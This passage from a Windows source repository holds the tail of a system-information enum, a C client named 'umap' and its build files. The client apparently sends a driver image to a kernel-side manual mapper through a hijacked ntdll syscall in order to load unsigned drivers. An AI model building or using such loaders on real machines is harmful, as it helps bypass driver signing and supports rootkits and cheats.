	SystemMemoryListInformation = 0x50,
	SystemFileCacheInformationEx = 0x51,
	SystemThreadPriorityClientIdInformation = 0x52,
	SystemProcessorIdleCycleTimeInformation = 0x53,
	SystemVerifierCancellationInformation = 0x54,
	SystemProcessorPowerInformationEx = 0x55,
	SystemRefTraceInformation = 0x56,
	SystemSpecialPoolInformation = 0x57,
	SystemProcessIdInformation = 0x58,
	SystemErrorPortInformation = 0x59,
	SystemBootEnvironmentInformation = 0x5a,
	SystemHypervisorInformation = 0x5b,
	SystemVerifierInformationEx = 0x5c,
	SystemTimeZoneInformation = 0x5d,
	SystemImageFileExecutionOptionsInformation = 0x5e,
	SystemCoverageInformation = 0x5f,
	SystemPrefetchPatchInformation = 0x60,
	SystemVerifierFaultsInformation = 0x61,
	SystemSystemPartitionInformation = 0x62,
	SystemSystemDiskInformation = 0x63,
	SystemProcessorPerformanceDistribution = 0x64,
	SystemNumaProximityNodeInformation = 0x65,
	SystemDynamicTimeZoneInformation = 0x66,
	SystemCodeIntegrityInformation = 0x67,
	SystemProcessorMicrocodeUpdateInformation = 0x68,
	SystemProcessorBrandString = 0x69,
	SystemVirtualAddressInformation = 0x6a,
	SystemLogicalProcessorAndGroupInformation = 0x6b,
	SystemProcessorCycleTimeInformation = 0x6c,
	SystemStoreInformation = 0x6d,
	SystemRegistryAppendString = 0x6e,
	SystemAitSamplingValue = 0x6f,
	SystemVhdBootInformation = 0x70,
	SystemCpuQuotaInformation = 0x71,
	SystemNativeBasicInformation = 0x72,
	SystemErrorPortTimeouts = 0x73,
	SystemLowPriorityIoInformation = 0x74,
	SystemBootEntropyInformation = 0x75,
	SystemVerifierCountersInformation = 0x76,
	SystemPagedPoolInformationEx = 0x77,
	SystemSystemPtesInformationEx = 0x78,
	SystemNodeDistanceInformation = 0x79,
	SystemAcpiAuditInformation = 0x7a,
	SystemBasicPerformanceInformation = 0x7b,
	SystemQueryPerformanceCounterInformation = 0x7c,
	SystemSessionBigPoolInformation = 0x7d,
	SystemBootGraphicsInformation = 0x7e,
	SystemScrubPhysicalMemoryInformation = 0x7f,
	SystemBadPageInformation = 0x80,
	SystemProcessorProfileControlArea = 0x81,
	SystemCombinePhysicalMemoryInformation = 0x82,
	SystemEntropyInterruptTimingInformation = 0x83,
	SystemConsoleInformation = 0x84,
	SystemPlatformBinaryInformation = 0x85,
	SystemThrottleNotificationInformation = 0x86,
	SystemHypervisorProcessorCountInformation = 0x87,
	SystemDeviceDataInformation = 0x88,
	SystemDeviceDataEnumerationInformation = 0x89,
	SystemMemoryTopologyInformation = 0x8a,
	SystemMemoryChannelInformation = 0x8b,
	SystemBootLogoInformation = 0x8c,
	SystemProcessorPerformanceInformationEx = 0x8d,
	SystemSpare0 = 0x8e,
	SystemSecureBootPolicyInformation = 0x8f,
	SystemPageFileInformationEx = 0x90,
	SystemSecureBootInformation = 0x91,
	SystemEntropyInterruptTimingRawInformation = 0x92,
	SystemPortableWorkspaceEfiLauncherInformation = 0x93,
	SystemFullProcessInformation = 0x94,
	SystemKernelDebuggerInformationEx = 0x95,
	SystemBootMetadataInformation = 0x96,
	SystemSoftRebootInformation = 0x97,
	SystemElamCertificateInformation = 0x98,
	SystemOfflineDumpConfigInformation = 0x99,
	SystemProcessorFeaturesInformation = 0x9a,
	SystemRegistryReconciliationInformation = 0x9b,
	SystemSupportedProcessArchitectures = 0xb5,
} SYSTEM_INFORMATION_CLASS;
```

`umap/main.c`:

```c
#include <stdio.h>
#include <Windows.h>

typedef struct {
	unsigned short magic;
	unsigned int length;
	char buffer[1];
} image_data;

int map(image_data *buffer, unsigned int size) {
	void *(*NtConvertBetweenAuxiliaryCounterAndPerformanceCounter)(void *, void *, void *, void *);
	*(void **)&NtConvertBetweenAuxiliaryCounterAndPerformanceCounter = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtConvertBetweenAuxiliaryCounterAndPerformanceCounter");

	if (!NtConvertBetweenAuxiliaryCounterAndPerformanceCounter) {
		printf("NtConvertBetweenAuxiliaryCounterAndPerformanceCounter not found\n");
		return 1;
	}

	unsigned short magic = *(unsigned short *)buffer->buffer;

	unsigned int status = 0;
	NtConvertBetweenAuxiliaryCounterAndPerformanceCounter(0, &buffer, &status, 0);

	if (*(unsigned short *)buffer->buffer == magic) {
		printf("Failed to communicate with the mapper\n");
		return 1;
	} else if (buffer->buffer[0]) {
		printf("Manual mapping failed:\n\t%s\n", buffer->buffer);
		return 1;
	}

	printf("DriverEntry returned 0x%X\n", status);
	return 0;
}

int main(int argc, const char **argv) {
	if (argc < 2) {
		printf("Usage: umap <DRIVER>\n");
		return 1;
	}

	FILE *file = NULL;
	if (fopen_s(&file, argv[1], "rb")) {
		printf("Failed to open file: %s\n", argv[1]);
		return 1;
	}

	fseek(file, 0, SEEK_END);
	ftell(file);

	unsigned int size = ftell(file);

	fseek(file, 0, SEEK_SET);

	int status = 0;
	image_data *buffer = malloc(size + sizeof(image_data) + 0xFF);
	if (buffer) {
		buffer->magic = 0x6789;
		buffer->length = size;

		fread(&buffer->buffer, size, 1, file);

		status = map(buffer, size);

		free(buffer);
	} else {
		printf("Failed to allocate buffer of size 0x%X\n", size);
		status = 1;
	}

	fclose(file);
	return status;
}
```

`umap/umap.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <ProjectGuid>{B5648E97-F82E-4EAF-9F84-9F2EAA2605D7}</ProjectGuid>
    <RootNamespace>umap</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="main.c" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`umap/umap.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```